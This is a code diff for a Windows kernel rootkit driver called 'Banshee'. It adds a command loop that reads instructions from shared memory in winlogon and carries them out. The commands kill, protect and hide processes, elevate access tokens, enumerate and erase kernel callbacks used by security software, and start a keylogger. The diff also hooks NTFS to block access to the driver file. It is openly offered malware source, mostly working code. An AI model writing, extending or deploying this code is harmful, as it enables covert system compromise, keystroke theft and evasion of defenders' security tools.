@@ -17,23 +17,30 @@
 // --------------------------------------------------------------------------------------------------------
 
 HANDLE hKeyloggerThread;
+HANDLE hMainLoop;
+
+typedef struct _BANSHEE_PAYLOAD {
+    COMMAND_TYPE cmdType;
+    ULONG status;
+    ULONG ulValue;
+    BYTE byteValue;
+    WCHAR wcharString[64];
+    CALLBACK_DATA callbackData[32];
+} BANSHEE_PAYLOAD;
 
 /**
  * Called on unloading the driver.
  *
- * @param DriverObject Pointer to the DriverObject.
  * @return NTSTATUS status code.
  */
 NTSTATUS
-BeUnload(PDRIVER_OBJECT DriverObject)
+BeUnload()
 {
-    // TODO: call this from the client deliberately
-
     LOG_MSG("Unload Called \r\n");
 
     BeGlobals::shutdown = true;
 
-    // Wait for keylogger to stop running TODO: proper signaling
+    // Wait for keylogger to stop running TODO: proper signaling via events?
     BeGlobals::logKeys = false;
     LARGE_INTEGER interval;
     interval.QuadPart = -1 * (LONGLONG)500 * 10000;
@@ -88,41 +95,100 @@ BeUnload(PDRIVER_OBJECT DriverObject)
     // Delete shared memory
     BeCloseSharedMemory(BeGlobals::hSharedMemory, BeGlobals::pSharedMemory);
 
+    // Deref objects
+    ObDereferenceObject(BeGlobals::winLogonProc);
+
     LOG_MSG("Byebye!\n");
-        
+    PsTerminateSystemThread(0);
     return STATUS_SUCCESS;
 }
 
-/**
- * Called on closing the driver.
- *
- * @param DeviceObject Pointer to the DeviceObject.
- * @param Irp Pointer to the IO Request Packet (IRP)
- * @return NTSTATUS status code.
- */
-NTSTATUS 
-BeClose(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
+VOID
+BeMainLoop(PVOID StartContext)
 {
-    UNREFERENCED_PARAMETER(pDeviceObject);
-    UNREFERENCED_PARAMETER(Irp);
-    LOG_MSG("Close Called \r\n");
-    return STATUS_SUCCESS;
-}
+    UNREFERENCED_PARAMETER(StartContext);
 
-/**
- * Called on driver creation.
- *
- * @param DeviceObject Pointer to the DeviceObject.
- * @param Irp Pointer to the IO Request Packet (IRP)
- * @return NTSTATUS status code.
- */
-NTSTATUS 
-BeCreate(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
-{
-    UNREFERENCED_PARAMETER(pDeviceObject);
-    UNREFERENCED_PARAMETER(Irp);
-    LOG_MSG("Create Called \r\n");
-    return STATUS_SUCCESS;
+    KAPC_STATE apc;
+
+    while (true) 
+    {
+        LOG_MSG("Waiting for commandEvent...\n");
+        NTSTATUS status = BeWaitForEvent(BeGlobals::commandEvent);
+        LOG_MSG("CommandEvent Signaled! %d\n", status);
+
+        // Reset
+        status = BeSetNamedEvent(BeGlobals::commandEvent, FALSE);
+        LOG_MSG("CommandEvent reset! %d\n", status);
+
+        // Read command payload
+        KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
+        BANSHEE_PAYLOAD payload = *(BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory;
+        LOG_MSG("Read: %d\n", payload.cmdType);
+        KeUnstackDetachProcess(&apc);
+
+        // Execute command
+        NTSTATUS bansheeStatus = STATUS_NOT_IMPLEMENTED;
+        switch (payload.cmdType)
+        {
+        case KILL_PROCESS:
+            bansheeStatus = BeCmd_KillProcess(ULongToHandle(payload.ulValue));
+            break;
+        case PROTECT_PROCESS:
+            bansheeStatus = BeCmd_ProtectProcess(payload.ulValue, payload.byteValue);
+            break;
+        case ELEVATE_TOKEN:
+            bansheeStatus = BeCmd_ElevateProcessAcessToken(ULongToHandle(payload.ulValue));
+            break;
+        case HIDE_PROCESS:
+            bansheeStatus = BeCmd_HideProcess(ULongToHandle(payload.ulValue));
+            break;
+        case ENUM_CALLBACKS: 
+            {
+                auto cbData = BeCmd_EnumerateCallbacks((CALLBACK_TYPE)payload.ulValue);
+
+                // Write answer: copy over callbacks
+                KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
+                for (auto i = 0U; i < cbData.size(); ++i)
+                {
+                    CALLBACK_DATA cbd = { // TODO: this aint pretty, its a pity...
+                        cbData[i].driverBase,
+                        cbData[i].offset,
+                        NULL
+                    };
+                    memcpy(cbd.driverName, cbData[i].driverName, (wcslen(cbData[i].driverName) + 1) * sizeof(WCHAR));
+
+                    memcpy((PVOID)&(*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).callbackData[i], (PVOID)&cbd, sizeof(CALLBACK_DATA));
+                }
+                // Write amount of callbacks to ulValue
+                (*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).ulValue = (ULONG)cbData.size();
+                KeUnstackDetachProcess(&apc);
+            }
+            bansheeStatus = STATUS_SUCCESS;
+            break;
+        case ERASE_CALLBACKS:
+            bansheeStatus = BeCmd_EraseCallbacks(payload.wcharString, (CALLBACK_TYPE)payload.ulValue);
+            break;
+        case START_KEYLOGGER:
+            bansheeStatus = BeCmd_StartKeylogger((BOOLEAN)payload.byteValue);
+            break;
+        case UNLOAD:
+            BeSetNamedEvent(BeGlobals::answerEvent, TRUE);
+            BeUnload();
+            return;
+            break;
+        default:
+            break;
+        }
+
+        // Write answer
+        KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
+        (*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).status = bansheeStatus;
+        KeUnstackDetachProcess(&apc);
+
+        // Set answer event
+        BeSetNamedEvent(BeGlobals::answerEvent, TRUE);
+        LOG_MSG("Set answerEvent\n");
+    }
 }
 
 /**
@@ -140,6 +206,10 @@ BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
 
     NTSTATUS NtStatus = STATUS_SUCCESS;
 
+#if DENY_DRIVER_FILE_ACCESS
+    NtStatus = BeHookNTFSFileCreate();
+#endif
+
     LOG_MSG("Init globals\r\n");
     NtStatus = BeGlobals::BeInitGlobals();
     if (!NT_SUCCESS(NtStatus))
@@ -147,13 +217,15 @@ BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
         return NtStatus;
     }
 
-#if DENY_DRIVER_FILE_ACCESS
-    NtStatus = BeHookNTFSFileCreate();
-#endif
-
     // Start Keylogger Thread
-    PKTHREAD ThreadObject;
     NtStatus = PsCreateSystemThread(&hKeyloggerThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeKeyLoggerFunction, NULL);
+    if (NtStatus != 0)
+    {
+        return NtStatus;
+    }
+
+    // Main command loop
+    NtStatus = PsCreateSystemThread(&hMainLoop, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeMainLoop, NULL);
     if (NtStatus != 0)
     {
         return NtStatus;
@@ -173,7 +245,11 @@ extern "C"
 NTSTATUS
 DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
 {
-    LOG_MSG("DriverEntry Called \r\n");
+    LOG_MSG(" ______   ______   ______   ______   _    _   ______  ______ \n");
+    LOG_MSG("| |  | \\ | |  | | | |  \\ \\ / |      | |  | | | |     | |     \n");
+    LOG_MSG("| |--| < | |__| | | |  | | '------. | |--| | | |---- | |---- \n");
+    LOG_MSG("|_|__|_/ |_|  |_| |_|  |_|  ____|_/ |_|  |_| |_|____ |_|____ \n");
+    LOG_MSG(BANSHEE_VERSION);
 
     // If mapped, e.g. with kdmapper, those are empty.
     UNREFERENCED_PARAMETER(pDriverObject);
